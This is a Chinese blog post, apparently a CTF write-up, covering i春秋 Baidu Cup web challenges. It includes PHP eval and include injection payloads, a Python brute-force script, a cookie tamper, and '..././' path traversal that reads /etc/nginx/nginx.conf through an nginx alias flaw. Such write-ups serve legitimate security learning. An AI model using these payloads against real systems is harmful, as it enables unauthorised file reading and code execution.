@@ -1,0 +1,1052 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="PHP,Web,WriteUp,code-audit,Nginx-vul," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Cytosineの有被小窝~" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="爆破-1challenge: 12345678include &amp;quot;flag.php&amp;quot;;$a = @$_REQUEST[&amp;apos;hello&amp;apos;];if(!preg_match(&amp;apos;/^\w*$/&amp;apos;,$a ))&amp;#123;  die(&amp;apos;ERROR&amp;apos;);&amp;#125;eval(&amp;quot;var_dump($$a);&amp;quot;);sh">
+<meta name="keywords" content="PHP,Web,WriteUp,code-audit,Nginx-vul">
+<meta property="og:type" content="article">
+<meta property="og:title" content="i春秋CTF大本营 百度杯2017年2月 Web WriteUp">
+<meta property="og:url" content="https://lovegood.github.io/2018/08/19/writeup-ichunqiu-baidubei-201702-web/index.html">
+<meta property="og:site_name" content="Cytosineの有被小窝~">
+<meta property="og:description" content="爆破-1challenge: 12345678include &amp;quot;flag.php&amp;quot;;$a = @$_REQUEST[&amp;apos;hello&amp;apos;];if(!preg_match(&amp;apos;/^\w*$/&amp;apos;,$a ))&amp;#123;  die(&amp;apos;ERROR&amp;apos;);&amp;#125;eval(&amp;quot;var_dump($$a);&amp;quot;);sh">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://lovegood.github.io/2018/08/19/writeup-ichunqiu-baidubei-201702-web/all.png">
+<meta property="og:image" content="https://lovegood.github.io/2018/08/19/writeup-ichunqiu-baidubei-201702-web/web0-0.png">
+<meta property="og:image" content="https://lovegood.github.io/2018/08/19/writeup-ichunqiu-baidubei-201702-web/web0-1.png">
+<meta property="og:image" content="https://lovegood.github.io/2018/08/19/writeup-ichunqiu-baidubei-201702-web/web1.png">
+<meta property="og:image" content="https://lovegood.github.io/2018/08/19/writeup-ichunqiu-baidubei-201702-web/web2.png">
+<meta property="og:image" content="https://lovegood.github.io/2018/08/19/writeup-ichunqiu-baidubei-201702-web/web3-0.png">
+<meta property="og:image" content="https://lovegood.github.io/2018/08/19/writeup-ichunqiu-baidubei-201702-web/web3-1.png">
+<meta property="og:image" content="https://lovegood.github.io/2018/08/19/writeup-ichunqiu-baidubei-201702-web/web3-2.png">
+<meta property="og:image" content="https://lovegood.github.io/2018/08/19/writeup-ichunqiu-baidubei-201702-web/web3-3.png">
+<meta property="og:image" content="https://lovegood.github.io/2018/08/19/writeup-ichunqiu-baidubei-201702-web/web4-0.png">
+<meta property="og:image" content="https://lovegood.github.io/2018/08/19/writeup-ichunqiu-baidubei-201702-web/web4-1.png">
+<meta property="og:image" content="https://lovegood.github.io/2018/08/19/writeup-ichunqiu-baidubei-201702-web/web4-2.png">
+<meta property="og:image" content="https://lovegood.github.io/2018/08/19/writeup-ichunqiu-baidubei-201702-web/web4-3.png">
+<meta property="og:image" content="https://lovegood.github.io/2018/08/19/writeup-ichunqiu-baidubei-201702-web/web4-4.png">
+<meta property="og:image" content="https://lovegood.github.io/2018/08/19/writeup-ichunqiu-baidubei-201702-web/web4-5.png">
+<meta property="og:image" content="https://lovegood.github.io/2018/08/19/writeup-ichunqiu-baidubei-201702-web/web4-6.png">
+<meta property="og:image" content="https://lovegood.github.io/2018/08/19/writeup-ichunqiu-baidubei-201702-web/web4-7.png">
+<meta property="og:image" content="https://lovegood.github.io/2018/08/19/writeup-ichunqiu-baidubei-201702-web/web4-8.png">
+<meta property="og:image" content="https://lovegood.github.io/2018/08/19/writeup-ichunqiu-baidubei-201702-web/web4-9.png">
+<meta property="og:image" content="https://lovegood.github.io/2018/08/19/writeup-ichunqiu-baidubei-201702-web/web5.png">
+<meta property="og:updated_time" content="2018-08-19T15:53:10.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="i春秋CTF大本营 百度杯2017年2月 Web WriteUp">
+<meta name="twitter:description" content="爆破-1challenge: 12345678include &amp;quot;flag.php&amp;quot;;$a = @$_REQUEST[&amp;apos;hello&amp;apos;];if(!preg_match(&amp;apos;/^\w*$/&amp;apos;,$a ))&amp;#123;  die(&amp;apos;ERROR&amp;apos;);&amp;#125;eval(&amp;quot;var_dump($$a);&amp;quot;);sh">
+<meta name="twitter:image" content="https://lovegood.github.io/2018/08/19/writeup-ichunqiu-baidubei-201702-web/all.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://lovegood.github.io/2018/08/19/writeup-ichunqiu-baidubei-201702-web/"/>
+
+
+
+
+
+  <title>i春秋CTF大本营 百度杯2017年2月 Web WriteUp | Cytosineの有被小窝~</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Cytosineの有被小窝~</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">悟已往之不谏，知来者之可追。</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+            cd ~
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+            uname -a
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+            ls -al post
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://lovegood.github.io/2018/08/19/writeup-ichunqiu-baidubei-201702-web/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Cytosine">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.webp">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Cytosineの有被小窝~">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">i春秋CTF大本营 百度杯2017年2月 Web WriteUp</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-19T14:45:35+08:00">
+                2018-08-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><img src="all.png" alt=""></p>
+<h1 id="爆破-1"><a href="#爆破-1" class="headerlink" title="爆破-1"></a>爆破-1</h1><p>challenge:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">include &quot;flag.php&quot;;</div><div class="line">$a = @$_REQUEST[&apos;hello&apos;];</div><div class="line">if(!preg_match(&apos;/^\w*$/&apos;,$a ))&#123;</div><div class="line">  die(&apos;ERROR&apos;);</div><div class="line">&#125;</div><div class="line">eval(&quot;var_dump($$a);&quot;);</div><div class="line">show_source(__FILE__);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p><code>$$a</code>php动态变量名，<code>$a=&#39;abc&#39;</code>，那么<code>$$a</code>就是<code>$abc</code>。</p>
+<p>so:</p>
+<p><img src="web0-0.png" alt=""></p>
+<p>但是六位数爆破的话，能爆破出来，但是会很慢，那想想有没有什么取巧的办法呢？</p>
+<p><code>$GLOBALS</code>！php预定义的超全局变量，一个包含了全部变量的数组，键为变量名，值为变量值。</p>
+<p>so:</p>
+<p><img src="web0-1.png" alt=""></p>
+<p>get flag~</p>
+<h1 id="爆破-2"><a href="#爆破-2" class="headerlink" title="爆破-2"></a>爆破-2</h1><p>challenge:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">include &quot;flag.php&quot;;</div><div class="line">$a = @$_REQUEST[&apos;hello&apos;];</div><div class="line">eval( &quot;var_dump($a);&quot;);</div><div class="line">show_source(__FILE__);</div></pre></td></tr></table></figure>
+<p>hint:</p>
+<blockquote>
+<p>flag不在变量中。</p>
+</blockquote>
+<p><code>$GLOBALS</code>也不行，所以试试直接读flag.php的内容</p>
+<p>so:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?hello=file_get_contents(&apos;flag.php&apos;)</div></pre></td></tr></table></figure>
+<p><img src="web1.png" alt=""></p>
+<p>get flag~</p>
+<p>ps: other payloads:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">?hello=file(&apos;flag.php&apos;)</div><div class="line">?hello=);show_source(&apos;flag.php&apos;);var_dump(</div></pre></td></tr></table></figure>
+<h1 id="爆破-3"><a href="#爆破-3" class="headerlink" title="爆破-3"></a>爆破-3</h1><p>challenge:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">error_reporting(0);</div><div class="line">session_start();</div><div class="line">require(&apos;./flag.php&apos;);</div><div class="line">if(!isset($_SESSION[&apos;nums&apos;]))&#123;</div><div class="line">  $_SESSION[&apos;nums&apos;] = 0;</div><div class="line">  $_SESSION[&apos;time&apos;] = time();</div><div class="line">  $_SESSION[&apos;whoami&apos;] = &apos;ea&apos;;</div><div class="line">&#125;</div><div class="line"></div><div class="line">if($_SESSION[&apos;time&apos;]+120&lt;time())&#123;</div><div class="line">  session_destroy();</div><div class="line">&#125;</div><div class="line"></div><div class="line">$value = $_REQUEST[&apos;value&apos;];</div><div class="line">$str_rand = range(&apos;a&apos;, &apos;z&apos;);</div><div class="line">$str_rands = $str_rand[mt_rand(0,25)].$str_rand[mt_rand(0,25)];</div><div class="line"></div><div class="line">if($_SESSION[&apos;whoami&apos;]==($value[0].$value[1]) &amp;&amp; substr(md5($value),5,4)==0)&#123;</div><div class="line">  $_SESSION[&apos;nums&apos;]++;</div><div class="line">  $_SESSION[&apos;whoami&apos;] = $str_rands;</div><div class="line">  echo $str_rands;</div><div class="line">&#125;</div><div class="line"></div><div class="line">if($_SESSION[&apos;nums&apos;]&gt;=10)&#123;</div><div class="line">  echo $flag;</div><div class="line">&#125;</div><div class="line"></div><div class="line">show_source(__FILE__);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>hint:</p>
+<blockquote>
+<p>这个真的是爆破。</p>
+</blockquote>
+<p>先看一下php的代码</p>
+<ol>
+<li>先建立session，而且有效期只有120秒，好短</li>
+<li>然后取两次随机字符，拼接在一起，构成<code>$str_rands</code></li>
+<li>get/post的参数<code>value</code></li>
+<li>如果<code>$_SESSION[&#39;whoami&#39;]</code>等于<code>value</code>的第一位和第二位，并且，(md5($value)的第五位起的连着4位 <strong>==</strong> 0), <code>num++</code>，然后输出新的随机字符串</li>
+<li>如果whoami的值大于等于10了，输出flag</li>
+<li>注意<code>==</code>，若比较，如果传入的value是数组，则md5(value)返回NULL，NULL==0成立。</li>
+</ol>
+<p>似乎好像只能爆破？</p>
+<p>然后翻了几个师傅的wp，还真是爆破。</p>
+<p>那乖乖写脚本吧QAQ:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python2</div><div class="line"># -*- coding:utf8 -*-</div><div class="line">__author__ = &apos;Cytosine&apos;</div><div class="line"></div><div class="line">import requests</div><div class="line">import urllib</div><div class="line">import base64</div><div class="line">import hashlib</div><div class="line">import sys</div><div class="line">import string</div><div class="line">import re</div><div class="line"></div><div class="line"></div><div class="line">def foo():</div><div class="line">    url = &apos;http://9c18d9006d2c4c33ad622a5b1e834da73b8009d9e5d84ab6.game.ichunqiu.com/?value[]=%s&apos;</div><div class="line">    sess = requests.session()</div><div class="line">    chars = &apos;ea&apos;</div><div class="line"></div><div class="line">    for i in range(15):</div><div class="line">        params = url%chars</div><div class="line">        cont = sess.get(params).content</div><div class="line">        print cont</div><div class="line">        chars=cont[:2]</div><div class="line"></div><div class="line">    pass</div><div class="line"></div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    foo()</div><div class="line">    # print &apos;ok&apos;</div></pre></td></tr></table></figure>
+<p><img src="web2.png" alt=""></p>
+<h1 id="include"><a href="#include" class="headerlink" title="include"></a>include</h1><p>challenge:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">show_source(__FILE__);</div><div class="line">if(isset($_REQUEST[&apos;path&apos;]))&#123;</div><div class="line">    include($_REQUEST[&apos;path&apos;]);</div><div class="line">&#125;else&#123;</div><div class="line">    include(&apos;phpinfo.php&apos;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><img src="web3-0.png" alt=""></p>
+<p>hint:</p>
+<blockquote>
+<p>没错！就是文件包含漏洞。</p>
+</blockquote>
+<p>查看phpinfo</p>
+<p>发现<code>allow_url_include</code>开启：</p>
+<p><img src="web3-1.png" alt=""></p>
+<p>也就允许通过<code>?path=php://input</code>的形式，讲post的数据作为php代码来执行：</p>
+<p><img src="web3-2.png" alt=""></p>
+<p>可以看到dle345aae.php，flag明显就在这里了，cat一下：</p>
+<p><img src="web3-3.png" alt=""></p>
+<h1 id="Zone"><a href="#Zone" class="headerlink" title="Zone"></a>Zone</h1><p>hint:</p>
+<blockquote>
+<p>网站要上线了，还没测试呢，怎么办？</p>
+</blockquote>
+<p>进入题目，一个弹窗</p>
+<p><img src="web4-0.png" alt=""></p>
+<p>转到login.php</p>
+<p><img src="web4-1.png" alt=""></p>
+<p>admin,admin登陆一下，又一个弹窗：</p>
+<p><img src="web4-2.png" alt=""></p>
+<p>源码泄露也没找到emm，再回去看看请求包返回包，发现头绪：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">Cookie: UM_distinctid=1625583723926d-0d858c5efc83a9-49556c-13c680-1625583723fc7; pgv_pvi=5096256512; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1532588617,1533282191; Hm_lvt_9104989ce242a8e03049eaceca950328=1532588594; Hm_lvt_1a32f7c660491887db0960e9c314b022=1532588594; chkphone=acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O; login=0</div></pre></td></tr></table></figure>
+<p><code>login=0</code>明显有问题，改成<code>login=1</code>：</p>
+<p><img src="web4-3.png" alt=""></p>
+<p><img src="web4-4.png" alt=""></p>
+<p><a href="http://3bc66d331d6d4914890bc5b1b9fffa7d03a55c066a944ad3.game.ichunqiu.com/manages/admin.php" target="_blank" rel="external">http://3bc66d331d6d4914890bc5b1b9fffa7d03a55c066a944ad3.game.ichunqiu.com/manages/admin.php</a></p>
+<p>访问，自动变为：</p>
+<p><a href="http://3bc66d331d6d4914890bc5b1b9fffa7d03a55c066a944ad3.game.ichunqiu.com/manages/admin.php?module=index&amp;name=php" target="_blank" rel="external">http://3bc66d331d6d4914890bc5b1b9fffa7d03a55c066a944ad3.game.ichunqiu.com/manages/admin.php?module=index&amp;name=php</a></p>
+<p>index换成flag试试：</p>
+<p><img src="web4-5.png" alt=""></p>
+<p>然后，不会了，搜了一下，发现一个师傅写的wp，<a href="http://www.cnblogs.com/Mrsm1th/p/6600876.html" target="_blank" rel="external">http://www.cnblogs.com/Mrsm1th/p/6600876.html</a></p>
+<p>思路是<strong>绕过过滤，读取nginx配置文件，发现目录遍历、下载漏洞，得到flag</strong>。</p>
+<blockquote>
+<p><a href="http://3bc66d331d6d4914890bc5b1b9fffa7d03a55c066a944ad3.game.ichunqiu.com/manages/admin.php?module=in./dex&amp;name=php" target="_blank" rel="external">http://3bc66d331d6d4914890bc5b1b9fffa7d03a55c066a944ad3.game.ichunqiu.com/manages/admin.php?module=in./dex&amp;name=php</a> 访问失败<br><a href="http://3bc66d331d6d4914890bc5b1b9fffa7d03a55c066a944ad3.game.ichunqiu.com/manages/admin.php?module=in../dex&amp;name=php" target="_blank" rel="external">http://3bc66d331d6d4914890bc5b1b9fffa7d03a55c066a944ad3.game.ichunqiu.com/manages/admin.php?module=in../dex&amp;name=php</a> 访问成功 ../被过滤</p>
+</blockquote>
+<p><code>..././</code>绕过过滤<br>Nginx默认配置文件路径：/etc/nginx/nginx.conf</p>
+<p>所以构造：<code>?module=..././..././..././etc/nginx/nginx.conf&amp;name=</code></p>
+<p><img src="web4-6.png" alt=""></p>
+<p>最后一句<code>include sites-enabled/default;</code></p>
+<p>继续读取配置, <code>?module=..././..././..././etc/nginx/sites-enabled/default&amp;name=</code>:</p>
+<p><img src="web4-7.png" alt=""></p>
+<p>重点：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">location /online-movies &#123; </div><div class="line">	alias /movie/; </div><div class="line">	autoindex on; </div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>alias /movie<strong>/</strong></p>
+<p>在movie结尾的<code>/</code>上</p>
+<p><a href="http://luoq.net/ais/1191/" target="_blank" rel="external">http://luoq.net/ais/1191/</a></p>
+<p>正确配置是结尾不应带<code>/</code>，若带了<code>/</code>:</p>
+<blockquote>
+<p>当你浏览 <a href="http://sebug.net/paper/" target="_blank" rel="external">http://sebug.net/paper/</a> ,正常情况应该遍历/home/wwwroot/paper/这个目录，但是如果访问 <a href="http://sebug.net/paper../" target="_blank" rel="external">http://sebug.net/paper../</a> ， 这个的话就会遍历/home/wwwroot/这个目录了</p>
+</blockquote>
+<p>所以，访问 <a href="http://3bc66d331d6d4914890bc5b1b9fffa7d03a55c066a944ad3.game.ichunqiu.com/online-movies../" target="_blank" rel="external">http://3bc66d331d6d4914890bc5b1b9fffa7d03a55c066a944ad3.game.ichunqiu.com/online-movies../</a> ：</p>
+<p><img src="web4-8.png" alt=""></p>
+<p>然后想进<code>/var/www/html</code>，发现html点完下载了一个文件，file一下，一个php脚本，内容的index.php的内容。。。</p>
+<p>然后翻了下wp，直接下载：</p>
+<p><a href="http://3bc66d331d6d4914890bc5b1b9fffa7d03a55c066a944ad3.game.ichunqiu.com/online-movies../var/www/html/flag.php" target="_blank" rel="external">http://3bc66d331d6d4914890bc5b1b9fffa7d03a55c066a944ad3.game.ichunqiu.com/online-movies../var/www/html/flag.php</a></p>
+<p>得到flag</p>
+<p><img src="web4-9.png" alt=""></p>
+<h1 id="OneThink"><a href="#OneThink" class="headerlink" title="OneThink"></a>OneThink</h1><p><img src="web5.png" alt=""></p>
+<p>搜一下，thinkphp3.2的漏洞，发现可以通过缓存执行命令</p>
+<p><a href="https://bbs.ichunqiu.com/thread-4918-1-1.html" target="_blank" rel="external">https://bbs.ichunqiu.com/thread-4918-1-1.html</a></p>
+<p>所以吖，窝们也学着写个shell到缓存文件里，执行命令~</p>
+<p>wp</p>
+<p><a href="https://www.cnblogs.com/zhengjim/p/6666961.html‘" target="_blank" rel="external">https://www.cnblogs.com/zhengjim/p/6666961.html‘</a></p>
+<p>玩了一晚上瘟疫公司。。不想写了，洗洗睡觉</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>窝很可爱，请给窝钱</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>赞赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat.png" alt="Cytosine 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="Cytosine 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/PHP/" rel="tag"># PHP</a>
+          
+            <a href="/tags/Web/" rel="tag"># Web</a>
+          
+            <a href="/tags/WriteUp/" rel="tag"># WriteUp</a>
+          
+            <a href="/tags/code-audit/" rel="tag"># code-audit</a>
+          
+            <a href="/tags/Nginx-vul/" rel="tag"># Nginx-vul</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/08/16/note-python-numpy-usage/" rel="next" title="Python-NumPy-Usage">
+                <i class="fa fa-chevron-left"></i> Python-NumPy-Usage
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/08/21/writeup-2018wangdingbei/" rel="prev" title="2018网鼎杯部分WriteUp">
+                2018网鼎杯部分WriteUp <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.webp"
+                alt="Cytosine" />
+            
+              <p class="site-author-name" itemprop="name">Cytosine</p>
+              <p class="site-description motion-element" itemprop="description">悟已往之不谏，知来者之可追。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">37</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">60</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          <div class="links-of-author motion-element">
+            
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/Lovegood" target="_blank" title="GitHub">
+                    GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://www.zhihu.com/people/CytosineLovegood/activities" target="_blank" title="知乎">
+                    知乎</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://zhuanlan.zhihu.com/dashijian" target="_blank" title="安全大事件">
+                    安全大事件</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://xuptsec.github.io/" target="_blank" title="XUPTSEC-blog">
+                    XUPTSEC-blog</a>
+                </span>
+              
+            
+          </div>
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                from dalao import
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://exp101t.blogspot.com/" title="Murasaki" target="_blank">Murasaki</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://pcat.cnblogs.com/" title="pcat" target="_blank">pcat</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://flygon.net/" title="飞龙" target="_blank">飞龙</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://ju5tw4nty0u.top/" title="ju5tw4nty0u" target="_blank">ju5tw4nty0u</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://darkwing.moe/" title="暗羽" target="_blank">暗羽</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://webdog.ml/" title="grt1st" target="_blank">grt1st</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.k0rz3n.com/" title="K0rz3n" target="_blank">K0rz3n</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://skysec.top/" title="一叶飘零" target="_blank">一叶飘零</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.lovei.org/" title="腹黑" target="_blank">腹黑</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
